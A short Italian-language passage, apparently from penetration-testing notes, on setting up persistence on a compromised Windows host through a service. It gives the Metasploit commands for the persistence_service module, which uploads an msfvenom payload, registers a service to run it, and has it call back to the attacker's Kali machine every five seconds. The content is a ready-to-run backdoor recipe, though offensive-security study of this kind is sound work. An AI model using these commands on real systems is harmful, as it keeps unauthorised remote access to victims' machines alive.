
# Persistenza tramite i Servizi Windows
dopo aver stabilito una sessione meterpreter su un target, possiamo utilizzare un modulo specifico per poter abilitare la persistenza sul sistema target tramite dei servizi. <br> 
Questo particolare modulo, genera un payload con msfvenom che verrá caricato sul target e creerà un nuovo servizio che avvierà il payload quindi per poter creare un nuovo servizio, abbiamo bisogno di ottenere l'accesso al sistema tramite un utente con privilegi amministrativi.
```bash
use exploit/windows/local/persistence_service
set SESSION 1
set LPORT <DiffPORT>
run
```
lasciando le variabili di default, il modulo creerà un servizio che ogni 5 secondi effettuerà una connessione con la nostra macchina kali. 
